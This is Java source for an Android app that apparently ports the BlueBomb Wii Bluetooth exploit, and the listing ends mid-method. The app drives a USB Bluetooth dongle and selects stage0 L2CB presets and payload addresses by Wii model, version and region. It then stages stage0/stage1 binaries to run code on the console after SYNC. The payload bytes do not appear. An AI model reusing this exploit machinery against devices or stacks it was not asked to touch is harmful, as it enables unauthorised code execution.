package com.androidbluebomb;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.usb.UsbConstants;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbEndpoint;
import android.hardware.usb.UsbInterface;
import android.hardware.usb.UsbManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Log;
import android.graphics.Color;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.net.Uri;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.HorizontalScrollView;
import android.widget.TextView;
import android.widget.Spinner;
import android.widget.ArrayAdapter;
import android.widget.AdapterView;

import java.nio.charset.StandardCharsets;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;
import java.util.Map;

public class MainActivity extends Activity {
    private static final String ACTION_USB_PERMISSION = "com.androidbluebomb.USB_PERMISSION";
    private static final String TAG = "BlueBombOTGDiag";
    private static final String LATEST_REPORT_NAME = "androidbluebomb_report_latest.txt";
    private static final String APP_DISPLAY_NAME = "Android BlueBomb";
    private static final String VERSION_NAME = "v1.0";
    private static final int APP_BACKGROUND_COLOR = Color.rgb(0x27, 0x27, 0x27);
    private static final int APP_TEXT_COLOR = Color.WHITE;

    // Default BlueBomb L2CB preset. 0x811725E0 is used by WII_SM4_3U/E and MINI_SM_NTSC in the original BlueBomb stage0 table.
    // This v0.7c reverte a regressão da v0.7 e mantém a conexão estável da v0.6b: CID local SDP=0x0041, Stage0 real em STRICT/AUTO e detecção S0.
    private static final int DEFAULT_BLUEBOMB_L2CB = 0x811725E0;
    private static final int DEFAULT_STAGE0_PAYLOAD_ADDR = 0x80004000;


    // USB Bluetooth HCI interface class tuple: 0xE0 / 0x01 / 0x01
    private static final int USB_CLASS_WIRELESS_CONTROLLER = 0xE0;
    private static final int USB_SUBCLASS_RF_CONTROLLER = 0x01;
    private static final int USB_PROTOCOL_BLUETOOTH = 0x01;

    // HCI opcodes used by this diagnostic build.
    private static final int HCI_SET_EVENT_MASK = 0x0C01;
    private static final int HCI_RESET = 0x0C03;
    private static final int HCI_READ_LOCAL_VERSION = 0x1001;
    private static final int HCI_READ_BD_ADDR = 0x1009;
    private static final int HCI_WRITE_LOCAL_NAME = 0x0C13;
    private static final int HCI_READ_LOCAL_NAME = 0x0C14;
    private static final int HCI_READ_SCAN_ENABLE = 0x0C19;
    private static final int HCI_WRITE_SCAN_ENABLE = 0x0C1A;
    private static final int HCI_DELETE_STORED_LINK_KEY = 0x0C12;
    private static final int HCI_READ_CLASS_OF_DEVICE = 0x0C23;
    private static final int HCI_WRITE_CLASS_OF_DEVICE = 0x0C24;
    private static final int HCI_READ_CURRENT_IAC_LAP = 0x0C39;
    private static final int HCI_WRITE_CURRENT_IAC_LAP = 0x0C3A;
    private static final int HCI_ACCEPT_CONNECTION_REQUEST = 0x0409;
    private static final int HCI_LINK_KEY_REQUEST_NEGATIVE_REPLY = 0x040C;
    private static final int HCI_PIN_CODE_REQUEST_NEGATIVE_REPLY = 0x040E;


    private UsbManager usbManager;
    private UsbDevice selectedDevice;
    private UsbDeviceConnection connection;
    private UsbInterface hciInterface;
    private UsbEndpoint eventInEndpoint;
    private UsbEndpoint aclInEndpoint;
    private UsbEndpoint aclOutEndpoint;

    private final Object controlTransferLock = new Object();
    private volatile boolean eventMonitorRunning = false;
    private volatile boolean aclMonitorRunning = false;
    private Thread eventMonitorThread;
    private Thread aclMonitorThread;
    private volatile int activeConnectionHandle = -1;
    private volatile String activeRemoteBdAddr = null;
    private int nextL2capIdentifier = 1;

    private static final int L2CAP_CID_SIGNALING = 0x0001;
    private static final int L2CAP_PSM_SDP = 0x0001;
    private static final int L2CAP_PSM_HID_CONTROL = 0x0011;
    private static final int L2CAP_PSM_HID_INTERRUPT = 0x0013;
    private static final int LOCAL_CID_SDP = 0x0040;
    private static final int LOCAL_CID_HID_CONTROL = 0x0042;
    private static final int LOCAL_CID_HID_INTERRUPT = 0x0043;
    private volatile int sdpLocalCid = -1;
    private volatile int sdpRemoteCid = -1;
    private volatile int hidControlLocalCid = -1;
    private volatile int hidControlRemoteCid = -1;
    private volatile int hidInterruptLocalCid = -1;
    private volatile int hidInterruptRemoteCid = -1;
    private volatile boolean sdpProactiveSent = false;
    private volatile boolean sdpConfigSeen = false;
    private volatile boolean bluebombSdpFlowStarted = false;
    private volatile boolean stage0FirstSent = false;
    private volatile boolean stage0RemainderSent = false;
    private volatile boolean haxScheduled = false;
    private volatile boolean haxTriggered = false;
    private volatile boolean stage0ResponseSeen = false;
    private volatile boolean stage0StrictContinuation = true;
    private volatile boolean stage0PaddedContinuation = false;
    private volatile long sdpStartDelayMs = 250;
    private volatile long stage0AttrDelayMs = 350;
    private volatile long stage0RemainderDelayMs = 900;
    private volatile long stage0HaxDelayMs = 5000;
    private volatile boolean stage1UploadEnabled = true;
    private volatile boolean stage1UploadStarted = false;
    private volatile int stage1AckCount = 0;
    private volatile boolean stage1JumpEnabled = true;
    private volatile boolean requireExternalStage1 = false;
    private volatile boolean requireAssetStage1 = false;
    private final Object stage1AckLock = new Object();
    private volatile boolean discoverabilityWatchdogRunning = false;
    private volatile boolean discoverabilityWatchdogWiiMode = true;
    private volatile boolean pendingStartAfterDongleOpen = false;
    private volatile boolean releaseUserStartRequested = false;
    private volatile boolean releaseSetupStarted = false;

    private ImageButton releaseStartButton;
    private TextView releaseStatusView;
    private Spinner releaseConsoleSpinner;
    private Spinner releaseVersionSpinner;
    private Spinner releaseRegionSpinner;
    private volatile boolean updatingStage0Spinners = false;
    private volatile boolean releaseFinalStateLocked = false;
    private volatile String selectedConsoleType = "Wii";
    private volatile String selectedSystemVersion = "4.3";
    private volatile String selectedRegion = "U";
    private volatile String selectedStage0AssetName = "stage0/WII_SM4_3U.bin";
    private volatile int selectedBlueBombL2cb = DEFAULT_BLUEBOMB_L2CB;
    private volatile int selectedStage0PayloadAddr = DEFAULT_STAGE0_PAYLOAD_ADDR;



    private TextView logView;
    private ScrollView scrollView;
    private final StringBuilder logBuffer = new StringBuilder();

    private final BroadcastReceiver usbPermissionReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (!ACTION_USB_PERMISSION.equals(intent.getAction())) return;

            UsbDevice device = getUsbDeviceExtra(intent);
            boolean granted = intent.getBooleanExtra(UsbManager.EXTRA_PERMISSION_GRANTED, false);
            if (device == null) {
                log("USB permission callback returned without a device.");
                return;
            }

            if (granted) {
                log("USB permission granted for " + shortDeviceName(device) + ". Opening...");
                openDevice(device);
                if (pendingStartAfterDongleOpen && connection != null) {
                    continuePendingStartAfterDongleOpen();
                }
            } else {
                log("USB permission denied for " + shortDeviceName(device) + ".");
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        usbManager = (UsbManager) getSystemService(Context.USB_SERVICE);
        registerUsbPermissionReceiver();
        buildUi();

        log("Android BlueBomb v1.0");
        log("Release UI refined: app icon, USB permission auto-open, and SYNC prompt before listening.");
        log("Core: BYTE-REARM + embedded stage1.bin asset, with selectable stage0 L2CB presets.");
        listUsbDevices();

        UsbDevice attached = getUsbDeviceExtra(getIntent());
        if (attached != null) {
            log("App opened by USB attach event: " + shortDeviceName(attached));
            selectedDevice = attached;
            if (usbManager.hasPermission(attached)) {
                log("USB permission already granted for attached dongle. Opening...");
                openDevice(attached);
            } else {
                log("USB dongle detected on app launch. Requesting permission...");
                requestOpenSpecificDevice(attached);
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try {
            unregisterReceiver(usbPermissionReceiver);
        } catch (Exception ignored) {
        }
        closeCurrentConnection();
    }

    private boolean isDebugBuild() {
        return (getApplicationInfo().flags & android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0;
    }

    private void buildUi() {
        if (isDebugBuild()) {
            buildDebugUi();
        } else {
            buildReleaseUi();
        }
    }

    private void buildDebugUi() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dp(8), dp(8), dp(8), dp(8));
        root.setBackgroundColor(APP_BACKGROUND_COLOR);

        TextView title = new TextView(this);
        title.setText("Android BlueBomb " + VERSION_NAME + " Debug");
        title.setTextColor(APP_TEXT_COLOR);
        title.setTextSize(18);
        title.setGravity(Gravity.CENTER_VERTICAL);
        root.addView(title, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));

        TextView hint = new TextView(this);
        hint.setText("Debug flow: List USB → Open dongle → Setup Wii BYTE REARM / STAGE1 ASSET / EXTERNAL → SYNC → Save Log as TXT");
        hint.setTextColor(APP_TEXT_COLOR);
        hint.setTextSize(12);
        root.addView(hint, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));

        Button listButton = button("Listar USB");
        listButton.setOnClickListener(v -> listUsbDevices());

        Button openButton = button("Abrir dongle");
        openButton.setOnClickListener(v -> requestOpenFirstBluetoothDongle());

        Button setupWiiButton = button("Setup Wii STRICT");
        setupWiiButton.setOnClickListener(v -> {
            requireExternalStage1 = false;
            requireAssetStage1 = false;
            setStage0Profile(false, 250, 350, 900, 5000);
            runSetupListenMode(true, true, false, false);
        });

        Button setupAutoButton = button("Setup Wii BYTE REARM");
        // BYTE: conecta como STRICT/quieto, mas envia Stage0 como AUTO,
        // com continuação truncada igual ao BlueBomb original. Este modo permite fallback benigno.
        setupAutoButton.setOnClickListener(v -> {
            requireExternalStage1 = false;
            requireAssetStage1 = false;
            setStage0Profile(false, 250, 350, 900, 5000);
            runSetupListenMode(true, false, false, true);
        });

        Button setupAssetButton = button("Setup Wii STAGE1 ASSET");
        // Usa o stage1.bin embutido em app/src/main/assets/stage1.bin.
        // Se o asset faltar, aborta após S0 em vez de executar fallback.
        setupAssetButton.setOnClickListener(v -> {
            requireExternalStage1 = false;
            requireAssetStage1 = true;
            logStage1ExternalStatus();
            setStage0Profile(false, 250, 350, 900, 5000);
            runSetupListenMode(true, false, false, true);
        });

        Button setupExternalButton = button("Setup Wii STAGE1 EXTERNO");
        // Mesmo fluxo de conexão do BYTE REARM, mas exige stage1.bin no diretório app-specific.
        // Se o arquivo faltar ou for inválido, aborta após S0 em vez de executar fallback.
        setupExternalButton.setOnClickListener(v -> {
            requireExternalStage1 = true;
            requireAssetStage1 = false;
            logStage1ExternalStatus();
            setStage0Profile(false, 250, 350, 900, 5000);
            runSetupListenMode(true, false, false, true);
        });

        Button stage1StatusButton = button("Verificar stage1.bin");
        stage1StatusButton.setOnClickListener(v -> logStage1ExternalStatus());

        Button setupPcButton = button("Setup PC/Dolphin");
        setupPcButton.setOnClickListener(v -> {
            requireExternalStage1 = false;
            requireAssetStage1 = false;
            setStage0Profile(false, 250, 350, 900, 5000);
            runSetupListenMode(false, false, false, false);
        });

        Button saveButton = button("Save Log as TXT");
        saveButton.setOnClickListener(v -> saveReport());

        Button stopButton = button("Stop");
        stopButton.setOnClickListener(v -> stopMonitors());

        Button clearButton = button("Clear log");
        clearButton.setOnClickListener(v -> {
            synchronized (logBuffer) {
                logBuffer.setLength(0);
            }
            logView.setText("");
            log("Log limpo.");
        });

        addButtonRow(root, listButton, openButton);
        addButtonRow(root, setupWiiButton, setupAutoButton);
        addButtonRow(root, setupAssetButton, setupExternalButton);
        addButtonRow(root, stage1StatusButton, setupPcButton);
        addButtonRow(root, saveButton, stopButton);
        addButtonRow(root, clearButton, null);

        // Botões de diagnóstico avançado ficam numa área horizontal pequena e rolável.
        // Assim eles não esmagam o log na tela do celular.
        LinearLayout advancedRow = new LinearLayout(this);
        advancedRow.setOrientation(LinearLayout.HORIZONTAL);

        Button resetButton = button("HCI Reset");
        resetButton.setOnClickListener(v -> runHciReset());
        advancedRow.addView(resetButton, compactButtonParams());

        Button versionButton = button("Read Version");
        versionButton.setOnClickListener(v -> runReadLocalVersion());
        advancedRow.addView(versionButton, compactButtonParams());

        Button addrButton = button("Read BD_ADDR");
        addrButton.setOnClickListener(v -> runReadBdAddr());
        advancedRow.addView(addrButton, compactButtonParams());

        Button nameButton = button("Set Name");
        nameButton.setOnClickListener(v -> runSetWiiLikeName());
        advancedRow.addView(nameButton, compactButtonParams());

        Button scanButton = button("Scan 0x03");
        scanButton.setOnClickListener(v -> runEnableScan());
        advancedRow.addView(scanButton, compactButtonParams());

        Button classButton = button("Class");
        classButton.setOnClickListener(v -> runWriteWiimoteLikeClass());
        advancedRow.addView(classButton, compactButtonParams());

        Button eventMaskButton = button("EventMask");
        eventMaskButton.setOnClickListener(v -> runSetClassicEventMask());
        advancedRow.addView(eventMaskButton, compactButtonParams());

        Button iacButton = button("IAC LIAC");
        iacButton.setOnClickListener(v -> runSetLimitedIacLap());
        advancedRow.addView(iacButton, compactButtonParams());

        Button iacDualButton = button("IAC LIAC+GIAC");
        iacDualButton.setOnClickListener(v -> runSetDualIacLap());
        advancedRow.addView(iacDualButton, compactButtonParams());

        Button readStateButton = button("Read Estado");
        readStateButton.setOnClickListener(v -> runReadControllerState());
        advancedRow.addView(readStateButton, compactButtonParams());

        Button eventMonButton = button("Mon HCI");
        eventMonButton.setOnClickListener(v -> startEventMonitor());
        advancedRow.addView(eventMonButton, compactButtonParams());

        Button aclMonButton = button("Mon ACL");
        aclMonButton.setOnClickListener(v -> startAclMonitor());
        advancedRow.addView(aclMonButton, compactButtonParams());

        Button aclInfoButton = button("L2CAP Info");
        aclInfoButton.setOnClickListener(v -> runSendL2capInfoRequest());
        advancedRow.addView(aclInfoButton, compactButtonParams());

        Button sdpProButton = button("SDP Proativo");
        sdpProButton.setOnClickListener(v -> scheduleProactiveSdpProbe("botao manual", 0));
        advancedRow.addView(sdpProButton, compactButtonParams());

        HorizontalScrollView advancedScroll = new HorizontalScrollView(this);
        advancedScroll.addView(advancedRow);
        root.addView(advancedScroll, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));

        scrollView = new ScrollView(this);
        logView = new TextView(this);
        logView.setTextSize(12);
        logView.setTextIsSelectable(true);
        logView.setTextColor(APP_TEXT_COLOR);
        scrollView.addView(logView);
        LinearLayout.LayoutParams logParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                0);
        logParams.weight = 1;
        root.addView(scrollView, logParams);

        setContentView(root);
    }

    private void buildReleaseUi() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        // Extra top padding prevents the title from being clipped on phones where
        // the status bar overlaps a NoActionBar activity.
        root.setPadding(dp(18), dp(58), dp(18), dp(18));
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setBackgroundColor(APP_BACKGROUND_COLOR);

        TextView title = new TextView(this);
        title.setText(APP_DISPLAY_NAME);
        title.setTextSize(26);
        title.setTextColor(APP_TEXT_COLOR);
        title.setGravity(Gravity.CENTER);
        root.addView(title, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));

        TextView hint = new TextView(this);
        hint.setText("Connect the USB Bluetooth dongle with OTG, tap Start, then press SYNC on the Wii.");
        hint.setTextSize(14);
        hint.setTextColor(APP_TEXT_COLOR);
        hint.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams hintParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        hintParams.setMargins(0, dp(8), 0, dp(12));
        root.addView(hint, hintParams);

        addReleaseTargetSelectors(root);

        releaseStartButton = new ImageButton(this);
        releaseStartButton.setImageResource(R.drawable.start_button_active);
        releaseStartButton.setBackgroundColor(Color.TRANSPARENT);
        releaseStartButton.setScaleType(ImageView.ScaleType.FIT_CENTER);
        releaseStartButton.setAdjustViewBounds(true);
        releaseStartButton.setContentDescription("Start Android BlueBomb");
        releaseStartButton.setOnClickListener(v -> startUserModeBlueBomb());
        LinearLayout.LayoutParams startParams = new LinearLayout.LayoutParams(dp(188), dp(188));
        startParams.gravity = Gravity.CENTER_HORIZONTAL;
        startParams.setMargins(0, dp(4), 0, dp(12));
        root.addView(releaseStartButton, startParams);

        Button saveButton = button("Save Log as TXT");
        saveButton.setOnClickListener(v -> saveReport());
        LinearLayout.LayoutParams saveParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        saveParams.setMargins(0, 0, 0, dp(10));
        root.addView(saveButton, saveParams);

        TextView statusTitle = new TextView(this);
        statusTitle.setText("Status");
        statusTitle.setTextSize(16);
        statusTitle.setTextColor(APP_TEXT_COLOR);
        statusTitle.setGravity(Gravity.CENTER_HORIZONTAL);
        root.addView(statusTitle, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));

        releaseStatusView = new TextView(this);
        releaseStatusView.setText("Ready.");
        releaseStatusView.setTextSize(13);
        releaseStatusView.setTextColor(APP_TEXT_COLOR);
        releaseStatusView.setGravity(Gravity.CENTER_HORIZONTAL);
        LinearLayout.LayoutParams statusParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        statusParams.setMargins(0, dp(2), 0, dp(6));
        root.addView(releaseStatusView, statusParams);

        scrollView = new ScrollView(this);
        logView = new TextView(this);
        logView.setTextSize(12);
        logView.setTextColor(APP_TEXT_COLOR);
        logView.setTextIsSelectable(true);
        scrollView.addView(logView);
        LinearLayout.LayoutParams logParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                0);
        logParams.weight = 1;
        root.addView(scrollView, logParams);

        setReleaseStartState("active");
        setContentView(root);
    }


    private void addReleaseTargetSelectors(LinearLayout root) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER);

        releaseConsoleSpinner = createReleaseSpinner(new String[]{"Wii", "Wii mini"});
        releaseVersionSpinner = createReleaseSpinner(new String[]{"4.3"});
        releaseRegionSpinner = createReleaseSpinner(new String[]{"U"});

        row.addView(releaseConsoleSpinner, comboBoxParams(true, false));
        row.addView(releaseVersionSpinner, comboBoxParams(false, false));
        row.addView(releaseRegionSpinner, comboBoxParams(false, true));

        LinearLayout.LayoutParams rowParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        rowParams.setMargins(0, 0, 0, dp(10));
        root.addView(row, rowParams);

        AdapterView.OnItemSelectedListener listener = new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                if (updatingStage0Spinners) return;
                if (parent == releaseConsoleSpinner) {
                    selectedConsoleType = String.valueOf(parent.getItemAtPosition(position));
                    updateVersionAndRegionSpinners();
                } else if (parent == releaseVersionSpinner) {
                    selectedSystemVersion = String.valueOf(parent.getItemAtPosition(position));
                    updateRegionSpinner();
                } else if (parent == releaseRegionSpinner) {
                    selectedRegion = String.valueOf(parent.getItemAtPosition(position));
                    updateSelectedStage0FromReleaseUi(false);
                }
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {
            }
        };
        releaseConsoleSpinner.setOnItemSelectedListener(listener);
        releaseVersionSpinner.setOnItemSelectedListener(listener);
        releaseRegionSpinner.setOnItemSelectedListener(listener);

        updateVersionAndRegionSpinners();
    }

    private LinearLayout.LayoutParams comboBoxParams(boolean first, boolean last) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0, dp(42), 1);
        lp.setMargins(first ? 0 : dp(3), 0, last ? 0 : dp(3), 0);
        return lp;
    }

    private Spinner createReleaseSpinner(String[] values) {
        Spinner spinner = new Spinner(this);
        spinner.setAdapter(createSpinnerAdapter(values));
        return spinner;
    }

    private ArrayAdapter<String> createSpinnerAdapter(String[] values) {
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_spinner_item, values) {
            @Override
            public View getView(int position, View convertView, android.view.ViewGroup parent) {
                View v = super.getView(position, convertView, parent);
                if (v instanceof TextView) {
                    TextView tv = (TextView) v;
                    tv.setTextColor(APP_TEXT_COLOR);
                    tv.setGravity(Gravity.CENTER);
                    tv.setTextSize(12);
                }
                return v;
            }

            @Override
            public View getDropDownView(int position, View convertView, android.view.ViewGroup parent) {
                View v = super.getDropDownView(position, convertView, parent);
                if (v instanceof TextView) {
                    TextView tv = (TextView) v;
                    tv.setTextColor(Color.BLACK);
                    tv.setTextSize(14);
                }
                return v;
            }
        };
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        return adapter;
    }

    private void setSpinnerItems(Spinner spinner, String[] values, String preferredValue) {
        if (spinner == null) return;
        ArrayAdapter<String> adapter = createSpinnerAdapter(values);
        spinner.setAdapter(adapter);
        int selected = 0;
        if (preferredValue != null) {
            for (int i = 0; i < values.length; i++) {
                if (preferredValue.equals(values[i])) {
                    selected = i;
                    break;
                }
            }
        }
        spinner.setSelection(selected, false);
    }

    private void updateVersionAndRegionSpinners() {
        updatingStage0Spinners = true;
        try {
            String console = releaseConsoleSpinner == null ? selectedConsoleType : String.valueOf(releaseConsoleSpinner.getSelectedItem());
            selectedConsoleType = console;
            if ("Wii mini".equals(console)) {
                selectedSystemVersion = "Mini";
                setSpinnerItems(releaseVersionSpinner, new String[]{"Mini"}, selectedSystemVersion);
            } else {
                setSpinnerItems(releaseVersionSpinner, new String[]{"4.3", "4.2", "4.1", "4.0", "3.5", "3.4", "3.3", "3.2", "3.1", "3.0", "2.2", "2.1", "2.0"}, selectedSystemVersion);
                selectedSystemVersion = String.valueOf(releaseVersionSpinner.getSelectedItem());
            }
        } finally {
            updatingStage0Spinners = false;
        }
        updateRegionSpinner();
    }

    private void updateRegionSpinner() {
        updatingStage0Spinners = true;
        try {
            if (releaseConsoleSpinner != null) selectedConsoleType = String.valueOf(releaseConsoleSpinner.getSelectedItem());
            if (releaseVersionSpinner != null) selectedSystemVersion = String.valueOf(releaseVersionSpinner.getSelectedItem());
            String[] regions;
            if ("Wii mini".equals(selectedConsoleType)) {
                regions = new String[]{"NTSC", "PAL"};
            } else if ("3.5".equals(selectedSystemVersion)) {
                regions = new String[]{"K"};
            } else if ("2.1".equals(selectedSystemVersion)) {
                regions = new String[]{"E"};
            } else if ("4.1".equals(selectedSystemVersion) || "4.2".equals(selectedSystemVersion) || "4.3".equals(selectedSystemVersion)) {
                regions = new String[]{"U", "E", "J", "K"};
            } else {
                regions = new String[]{"U", "E", "J"};
            }
            setSpinnerItems(releaseRegionSpinner, regions, selectedRegion);
            selectedRegion = String.valueOf(releaseRegionSpinner.getSelectedItem());
        } finally {
            updatingStage0Spinners = false;
        }
        updateSelectedStage0FromReleaseUi(false);
    }

    private String buildSelectedStage0AssetName() {
        if ("Wii mini".equals(selectedConsoleType)) {
            return "stage0/MINI_SM_" + selectedRegion + ".bin";
        }
        String ver = selectedSystemVersion == null ? "4.3" : selectedSystemVersion;
        return "stage0/WII_SM" + ver.replace(".", "_") + selectedRegion + ".bin";
    }

    private boolean updateSelectedStage0FromReleaseUi(boolean logSelection) {
        if (releaseConsoleSpinner != null) selectedConsoleType = String.valueOf(releaseConsoleSpinner.getSelectedItem());
        if (releaseVersionSpinner != null) selectedSystemVersion = String.valueOf(releaseVersionSpinner.getSelectedItem());
        if (releaseRegionSpinner != null) selectedRegion = String.valueOf(releaseRegionSpinner.getSelectedItem());

        String assetName = buildSelectedStage0AssetName();
        int l2cb = loadStage0L2cbFromAsset(assetName);
        if (l2cb == 0) {
            setReleaseStartState("error");
            setReleaseStatus("Invalid Wii target. Restart the app.");
            log("ERROR: could not load selected Stage0 asset: " + assetName);
            return false;
        }
        selectedStage0AssetName = assetName;
        selectedBlueBombL2cb = l2cb;
        selectedStage0PayloadAddr = (l2cb >= 0x81000000) ? 0x80004000 : 0x81780000;
        if (logSelection) {
            log(String.format(Locale.US, "Stage0 target selected: %s (%s %s %s), L2CB=0x%08X payload_addr=0x%08X",
                    assetName, selectedConsoleType, selectedSystemVersion, selectedRegion, selectedBlueBombL2cb, selectedStage0PayloadAddr));
        }
        return true;
    }

    private int loadStage0L2cbFromAsset(String assetName) {
        try (InputStream in = getAssets().open(assetName)) {
            byte[] b = new byte[4];
            int read = in.read(b);
            if (read != 4) return 0;
            return ((b[0] & 0xFF) << 24) | ((b[1] & 0xFF) << 16) | ((b[2] & 0xFF) << 8) | (b[3] & 0xFF);
        } catch (Exception e) {
            log("ERROR: failed to read Stage0 asset " + assetName + ": " + e.getMessage());
            return 0;
        }
    }

    private void addButtonRow(LinearLayout root, Button left, Button right) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        if (left != null) row.addView(left, rowButtonParams(true));
        if (right != null) row.addView(right, rowButtonParams(false));
        root.addView(row, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));
    }

    private LinearLayout.LayoutParams rowButtonParams(boolean left) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        int m = dp(2);
        lp.setMargins(left ? 0 : m, m, left ? m : 0, m);
        return lp;
    }

    private LinearLayout.LayoutParams compactButtonParams() {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(dp(120), LinearLayout.LayoutParams.WRAP_CONTENT);
        int m = dp(2);
        lp.setMargins(m, m, m, m);
        return lp;
    }

    private Button button(String label) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextColor(APP_TEXT_COLOR);
        b.setBackgroundColor(Color.rgb(0x3A, 0x3A, 0x3A));
        return b;
    }

    private void startUserModeBlueBomb() {
        synchronized (logBuffer) {
            logBuffer.setLength(0);
        }
        releaseFinalStateLocked = false;
        releaseSetupStarted = false;
        releaseUserStartRequested = true;
        if (logView != null) logView.setText("");
        if (!updateSelectedStage0FromReleaseUi(true)) return;
        setReleaseStartState("inactive");
        setReleaseStatus("Preparing USB Bluetooth dongle...");
        log("Starting Android BlueBomb...");
        requireExternalStage1 = false;
        requireAssetStage1 = true;
        pendingStartAfterDongleOpen = true;
        listUsbDevices();
        if (connection != null && eventInEndpoint != null && aclInEndpoint != null && aclOutEndpoint != null) {
            pendingStartAfterDongleOpen = false;
            showReleaseSyncPromptThenStart();
        } else {
            requestOpenFirstBluetoothDongle();
        }
    }

    private void continuePendingStartAfterDongleOpen() {
        if (!pendingStartAfterDongleOpen) return;
        pendingStartAfterDongleOpen = false;
        log("Bluetooth dongle is ready.");
        requireExternalStage1 = false;
        requireAssetStage1 = true;
        if (!updateSelectedStage0FromReleaseUi(true)) return;
        if (isDebugBuild()) {
            beginReleaseBlueBombAfterSyncPrompt();
        } else {
            showReleaseSyncPromptThenStart();
        }
    }

    private void showReleaseSyncPromptThenStart() {
        if (releaseSetupStarted) return;
        if (isDebugBuild()) {
            beginReleaseBlueBombAfterSyncPrompt();
            return;
        }
        runOnUiThread(() -> {
            setReleaseStatus("Press SYNC on the Wii, then tap Start Sync.");
            new AlertDialog.Builder(this)
                    .setTitle("Ready to sync")
                    .setMessage("Press the red SYNC button on the Wii now.\n\nThen tap Start Sync to begin Android BlueBomb.")
                    .setCancelable(false)
                    .setPositiveButton("Start Sync", (dialog, which) -> beginReleaseBlueBombAfterSyncPrompt())
                    .setNegativeButton("Cancel", (dialog, which) -> {
                        pendingStartAfterDongleOpen = false;
                        releaseUserStartRequested = false;
                        releaseSetupStarted = false;
                        setReleaseStartState("active");
                        setReleaseStatus("Ready.");
                        log("User cancelled before starting Wii sync.");
                    })
                    .show();
        });
    }

    private void beginReleaseBlueBombAfterSyncPrompt() {
        if (releaseSetupStarted) return;
        releaseSetupStarted = true;
        releaseUserStartRequested = false;
        setReleaseStartState("inactive");
        setReleaseStatus("Listening for the Wii...");
        log("User confirmed SYNC. Starting Wii listener...");
        requireExternalStage1 = false;
        requireAssetStage1 = true;
        if (!updateSelectedStage0FromReleaseUi(true)) return;
        logStage1ExternalStatus();
        setStage0Profile(false, 250, 350, 900, 5000);
        runSetupListenMode(true, false, false, true);
        scheduleReleaseNoConnectionHint();
    }

    private void setReleaseStartState(String state) {
        if (isDebugBuild()) return;
        runOnUiThread(() -> {
            if (releaseStartButton == null) return;
            if (releaseFinalStateLocked && !("active".equals(state))) {
                // Once Release reaches Success/Error, do not let late disconnects or warnings change the button again.
                return;
            }
            if ("inactive".equals(state)) {
                releaseStartButton.setImageResource(R.drawable.start_button_inactive);
                releaseStartButton.setEnabled(false);
            } else if ("success".equals(state)) {
                releaseFinalStateLocked = true;
                releaseStartButton.setImageResource(R.drawable.start_button_success);
                releaseStartButton.setEnabled(false);
            } else if ("error".equals(state)) {
                releaseFinalStateLocked = true;
                releaseStartButton.setImageResource(R.drawable.start_button_error);
                releaseStartButton.setEnabled(false);
            } else {
                releaseFinalStateLocked = false;
